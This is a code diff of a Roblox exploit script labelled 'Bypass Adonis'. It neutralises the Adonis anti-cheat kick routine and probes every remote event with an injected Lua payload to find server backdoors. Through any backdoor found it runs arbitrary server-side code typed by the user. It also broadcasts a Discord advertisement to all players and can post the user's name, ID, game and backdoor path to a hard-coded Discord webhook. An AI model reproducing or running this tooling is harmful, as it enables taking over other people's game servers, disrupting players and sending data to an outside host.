@@ -1,6 +1,11 @@
 -- // Bypass Adonis
 
 
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService('ReplicatedStorage')
+local Players = game:GetService("Players")
+local Client = Players.LocalPlayer
 
 for k,v in pairs(game:GetDescendants()) do if pcall(function() return rawget(v,"indexInstance") end) and type(rawget(v,"indexInstance")) == "table" and (rawget(v,"indexInstance"))[1] == "kick" then v.tvk = {"kick",function() return false end} end end
 
@@ -12,7 +17,7 @@ task.wait(.5)
 local UI = {}
 
 -- // StarterGui.ScreenGui \\ --
-UI["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"))
+UI["1"] = Instance.new("ScreenGui", Client.PlayerGui)
 UI["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling
 UI["1"]["ResetOnSpawn"] = false
 
@@ -195,271 +200,264 @@ local function require(Module:ModuleScript)
 end
 
 G2L_MODULES[UI["a"]] = {
-Closure = function()
-    local script = UI["a"]
-local HttpService = game:GetService("HttpService")
-local RunService = game:GetService("RunService")
-local ReplicatedStorage = game:GetService('ReplicatedStorage')
-local Players = game:GetService("Players")
-local Client = Players.LocalPlayer
+    Closure = function()
+        local script = UI["a"]
 
-export type RemoteDictionary = { [string]: RemoteFunction | RemoteEvent }
 
-local BackdoorScanner = {}
-BackdoorScanner.__index = BackdoorScanner
 
-local BackdoorScannerMeta = {
-    __index = BackdoorScanner,
-    __newindex = function(t, k, v)
-        rawset(t, k, v)
-    end
-}
+        export type RemoteDictionary = { [string]: RemoteFunction | RemoteEvent }
 
-function BackdoorScanner:RunRemote(remote: RemoteFunction | RemoteEvent, payload: string)
-    if remote:IsA("RemoteEvent") then
-        pcall(remote.FireServer, remote, payload)
-    elseif remote:IsA("RemoteFunction") then
-        task.spawn(function()
-            pcall(remote.InvokeServer, remote, payload)
-        end)
-    end
-end
+        local BackdoorScanner = {}
+        BackdoorScanner.__index = BackdoorScanner
 
-function BackdoorScanner:FindRemote(statusLabel: TextLabel): RemoteDictionary
-    local startTime = tick()
-    local remotes: RemoteDictionary = {}
+        local BackdoorScannerMeta = {
+            __index = BackdoorScanner,
+            __newindex = function(t, k, v)
+                rawset(t, k, v)
+            end
+        }
 
-    local excludedPatterns = {
-        ['RobloxReplicatedStorage'] = true,
-        ['__FUNCTION'] = true,
-        ['HDAdminClient'] = true,
-        ['DefaultChatSystemChatEvents'] = true
-    }
+        function BackdoorScanner:RunRemote(remote: RemoteFunction | RemoteEvent, payload: string)
+            if remote:IsA("RemoteEvent") then
+                pcall(remote.FireServer, remote, payload)
+            elseif remote:IsA("RemoteFunction") then
+                task.spawn(function()
+                    pcall(remote.InvokeServer, remote, payload)
+                end)
+            end
+        end
 
-    local function isExcluded(name: string): boolean
-        for pattern in pairs(excludedPatterns) do
-            if name:find(pattern) then
+        function BackdoorScanner:FindRemote(statusLabel: TextLabel): RemoteDictionary
+            local startTime = tick()
+            local remotes: RemoteDictionary = {}
+
+            local excludedPatterns = {
+                ['RobloxReplicatedStorage'] = true,
+                ['__FUNCTION'] = true,
+                ['HDAdminClient'] = true,
+                ['DefaultChatSystemChatEvents'] = true
+            }
+
+            local function isExcluded(name: string): boolean
+                for pattern in pairs(excludedPatterns) do
+                    if name:find(pattern) then
+                        return true
+                    end
+                end
+                return false
+            end
+
+            for _, remote in ipairs(game:GetDescendants()) do
+                if  remote:IsA('RemoteEvent') or remote:IsA('RemoteFunction') then
+
+
+                    local fullName = remote:GetFullName()
+                    if isExcluded(fullName) then 
+                        continue 
+                    end
+
+                    local code = "TempCode" .. tick()
+                    self:RunRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
+                    remotes[code] = remote
+                end
+            end
+
+            local function checkRemote(remote: RemoteFunction | RemoteEvent, code: string): boolean
+                if not workspace:FindFirstChild(code) then
+                    return false
+                end
+
+                local elapsed = tick() - startTime
+                print("Backdoor found in " .. elapsed .. " seconds!")
+                statusLabel.Text = "Status : Inject"
+                statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+
+                self:RunRemote(remote, "a=Instance.new('Hint')a.Text='Hexon SS join now! : https://discord.gg/sc4zKCmhGP ' a.Parent=workspace wait(10) a:Destroy()")
+
+
+                if getgenv().Game_Log then
+                    pcall(function()
+                        request({
+                            Url = 'https://discord.com/api/webhooks/1274230884064694282/8Cy9F1lloRs7dfVksKMkLdgzE24eEKKzx_-aTDiGZxebGeZX0FpL4NPrPe4okmU7VnCY',
+                            Method = 'POST',
+                            Headers = { ['Content-Type'] = 'application/json' },
+                            Body = HttpService:JSONEncode({
+                                username = 'Backdoor Scanner',
+                                content = "**User: `" .. game:GetService('Players').LocalPlayer.Name .. "` | `" .. game:GetService('Players').LocalPlayer.UserId .. "`\nhttps://www.roblox.com/games/" .. game.PlaceId .. "\n`" .. remote:GetFullName() .. "`**",
+                            })
+                        })
+                    end)
+                end
                 return true
             end
-        end
-        return false
-    end
-
-   for _, remote in ipairs(game:GetDescendants()) do
-    if remote:IsA('RemoteEvent') or remote:IsA('RemoteFunction') then
-        local fullName = remote:GetFullName()
-        if isExcluded(fullName) then continue end
-        local code = "TempCode" .. tick()
-        self:RunRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
-        remotes[code] = remote
-    end
-end
 
 
-    local function checkRemote(remote: RemoteFunction | RemoteEvent, code: string): boolean
-    local backdoor = workspace:FindFirstChild(code)
-    if not backdoor then
-        return false
-    end
-    
 
-    local elapsed = tick() - startTime
-    print("Backdoor found in " .. elapsed .. " seconds!")
-    statusLabel.Text = "Status : Inject"
-    statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+            local batch_size = 100
+            local amount = 0
 
-  
-    self:RunRemote(remote, "a=Instance.new('Hint')a.Text='Hexon SS join now! : https://discord.gg/sc4zKCmhGP ' a.Parent=workspace wait(10) a:Destroy()")
-
-
-    if not getgenv().Game_Log then 
-       return 
-    end
-
-pcall(function()
-    request({
-        Url = 'https://discord.com/api/webhooks/1274230884064694282/8Cy9F1lloRs7dfVksKMkLdgzE24eEKKzx_-aTDiGZxebGeZX0FpL4NPrPe4okmU7VnCY',
-        Method = 'POST',
-        Headers = { ['Content-Type'] = 'application/json' },
-        Body = HttpService:JSONEncode({
-            username = 'Backdoor Scanner',
-            content = "**User: `" .. Client.Name .. "` | `" .. Client.UserId .. "`\nhttps://www.roblox.com/games/" .. game.PlaceId .. "\n`" .. remote:GetFullName() .. "`**",
-        })
-    })
-end)
-
-    
-    return true
-end
-
-    
-    
-    
-    local batch_size = 100
-    local amount = 0
-
-    while  amount < batch_size do
-        amount += 1
-        for code, remote in next, remotes do
-            if checkRemote(remote, code) then
-                return remotes
+            while  amount < batch_size do
+                amount += 1
+                for code, remote in pairs(remotes) do
+                    if checkRemote(remote, code) then
+                        return remotes
+                    end
+                end
+                RunService.Stepped:Wait()
             end
+
+            statusLabel.Text = "Status : Inject Failed, no Backdoors found"
+            statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+            return remotes
         end
-        RunService.Stepped:Wait()
+
+        setmetatable(BackdoorScanner, BackdoorScannerMeta)
+
+        return BackdoorScanner
+
+
     end
-
-    statusLabel.Text = "Status : Inject Failed, no Backdoors found"
-    statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
-    return remotes
-end
-
-setmetatable(BackdoorScanner, BackdoorScannerMeta)
-
-return BackdoorScanner
-
-
-end
 }
 G2L_MODULES[UI["c"]] = {
-Closure = function()
-    local script = UI["c"]
-local btn_callback = {}
+    Closure = function()
+        local script = UI["c"]
+        local btn_callback = {}
 
-btn_callback.__index= btn_callback
-
-
-btn_callback.OnceUpOnly = function(btn : TextButton | ImageButton, info)
-    local callback = info.Callback or function() end
-    
-    btn.MouseButton1Click:Once(function()
-        pcall(callback)
-    end)
-end
-
-btn_callback.ConnectEveryClick = function(btn : TextButton | ImageButton, info)
-    local callback = info.Callback or function() end
-
-    btn.MouseButton1Click:Connect(function()
-        pcall(callback)
-    end)
-end
+        btn_callback.__index= btn_callback
 
 
-return btn_callback
-end
+        btn_callback.OnceUpOnly = function(btn : TextButton | ImageButton, info)
+            local callback = info.Callback or function() end
+
+            btn.MouseButton1Click:Once(function()
+                pcall(callback)
+            end)
+        end
+
+        btn_callback.ConnectEveryClick = function(btn : TextButton | ImageButton, info)
+            local callback = info.Callback or function() end
+
+            btn.MouseButton1Click:Connect(function()
+                pcall(callback)
+            end)
+        end
+
+
+        return btn_callback
+    end
 }
 -- // StarterGui.ScreenGui.CanvasGroup.draggy \\ --
 local function SCRIPT_9()
-local script = UI["9"]
-	local UserInputService = game:GetService("UserInputService")
-	
-	local gui = script.Parent
-	
-	local dragging
-	local dragInput
-	local dragStart
-	local startPos
-	
-	local function update(input)
-	    local delta = input.Position - dragStart
-	    gui:TweenPosition(UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y), Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, 0.04, true) -- This is what I changed
-	end
-	
-	gui.InputBegan:Connect(function(input)
-	    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-	        dragging = true
-	        dragStart = input.Position
-	        startPos = gui.Position
-	
-	        input.Changed:Connect(function()
-	            if input.UserInputState == Enum.UserInputState.End then
-	                dragging = false
-	            end
-	        end)
-	    end
-	end)
-	
-	gui.InputChanged:Connect(function(input)
-	    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-	        dragInput = input
-	    end
-	end)
-	
-	UserInputService.InputChanged:Connect(function(input)
-	    if input == dragInput and dragging then
-	        update(input)
-	    end
-	end)
+    local script = UI["9"]
+    local UserInputService = game:GetService("UserInputService")
+
+    local gui = script.Parent
+
+    local dragging
+    local dragInput
+    local dragStart
+    local startPos
+
+    local function update(input)
+        local delta = input.Position - dragStart
+        gui:TweenPosition(UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y), Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, 0.04, true) -- This is what I changed
+    end
+
+    gui.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = gui.Position
+
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+
+    gui.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            dragInput = input
+        end
+    end)
+
+    UserInputService.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            update(input)
+        end
+    end)
 end
 task.spawn(SCRIPT_9)
 -- // StarterGui.ScreenGui.CanvasGroup.BackDoorScanner.LocalScript \\ --
 local function SCRIPT_b()
-local script = UI["b"]
-	local BackdoorScanner = require(script.Parent)
-	local button_manager = require(script.Parent.button_callback)
-	
-	local canvagroup = script.Parent.Parent
-	local statusLabel = canvagroup.status
-	local injectbtn = canvagroup.inject
-	local executebtn = canvagroup.execute
-	local clearbtn = canvagroup.clear
-	local txtbox = canvagroup.TextBox
-	local rsix = canvagroup.r6
-	local re = canvagroup.reset
-	local hide = canvagroup.hide
-	local censor = canvagroup.censor
-	
-	
-	local remotes = {}
-	
-	
-	local function Execute(remotes: RemoteDictionary, code: string)
-	    if next(remotes) then
-	        for _, remote in next, remotes do
-	            BackdoorScanner:RunRemote(remote, code)
-	        end
-	    else
-	        warn("Please inject before execute.")
-	    end
-	end
-	
-	button_manager.OnceUpOnly(injectbtn, {
-	    Callback = function()
-	        remotes = BackdoorScanner:FindRemote(statusLabel)
-	    end,
-	})
-	
-	button_manager.ConnectEveryClick(executebtn, {
-	    Callback = function()
-	        local code = txtbox.Text:gsub("LocalPlayer", tostring(game.Players.LocalPlayer))
-	        if code and code ~= "" then
-	            Execute(remotes, code)
-	        else
-	            warn("Please enter a valid code.")
-	        end
-	    end,
-	})
-	
-	button_manager.ConnectEveryClick(clearbtn, {
-	    Callback = function()
-	        txtbox.Text = ""
-	    end,
-	})
-	
-	
-	
-	button_manager.ConnectEveryClick(re, {
-	    Callback = function()
-	        Execute(remotes, [[game.Players.]]..tostring(game.Players.LocalPlayer)..[[:LoadCharacter()]])
-	    end,
-	})
-	
-	button_manager.ConnectEveryClick(rsix, {
-	    Callback = function()
-	        
-	        
-	        local r6_code = [[
-	        local plr = game.Players.]]..tostring(game.Players.LocalPlayer)..[[
+    local script = UI["b"]
+    local BackdoorScanner = require(script.Parent)
+    local button_manager = require(script.Parent.button_callback)
+
+    local canvagroup = script.Parent.Parent
+    local statusLabel = canvagroup.status
+    local injectbtn = canvagroup.inject
+    local executebtn = canvagroup.execute
+    local clearbtn = canvagroup.clear
+    local txtbox = canvagroup.TextBox
+    local rsix = canvagroup.r6
+    local re = canvagroup.reset
+    local hide = canvagroup.hide
+    local censor = canvagroup.censor
+
+
+    local remotes = {}
+
+
+    local function Execute(remotes: RemoteDictionary, code: string)
+        if next(remotes) then
+            for _, remote in next, remotes do
+                BackdoorScanner:RunRemote(remote, code)
+            end
+        else
+            warn("Please inject before execute.")
+        end
+    end
+
+    button_manager.OnceUpOnly(injectbtn, {
+        Callback = function()
+            remotes = BackdoorScanner:FindRemote(statusLabel)
+        end,
+    })
+
+    button_manager.ConnectEveryClick(executebtn, {
+        Callback = function()
+            local code = txtbox.Text:gsub("LocalPlayer", tostring(Client))
+            if code and code ~= "" then
+                Execute(remotes, code)
+            else
+                warn("Please enter a valid code.")
+            end
+        end,
+    })
+
+    button_manager.ConnectEveryClick(clearbtn, {
+        Callback = function()
+            txtbox.Text = ""
+        end,
+    })
+
+
+
+    button_manager.ConnectEveryClick(re, {
+        Callback = function()
+            Execute(remotes, [[game.Players.]]..tostring(Client)..[[:LoadCharacter()]])
+        end,
+    })
+
+    button_manager.ConnectEveryClick(rsix, {
+        Callback = function()
+
+
+            local r6_code = [[
+	        local plr = game.Players.]]..tostring(Client)..[[
 				if plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
 					local Main = game.Players:GetHumanoidDescriptionFromUserId(plr.CharacterAppearanceId)
 					local morph = game.Players:CreateHumanoidModelFromDescription(Main, Enum.HumanoidRigType.R6)
@@ -469,17 +467,17 @@ local script = UI["b"]
 					morph.Parent = workspace	
 				end
 	          ]]
-	        
-	        Execute(remotes, r6_code)
-	    end,
-	})
-	
-	
-	button_manager.ConnectEveryClick(hide, {
-	    Callback = function()
-	        censor.Visible = not censor.Visible
-	    end,
-	})
+
+            Execute(remotes, r6_code)
+        end,
+    })
+
+
+    button_manager.ConnectEveryClick(hide, {
+        Callback = function()
+            censor.Visible = not censor.Visible
+        end,
+    })
 end
 task.spawn(SCRIPT_b)
 
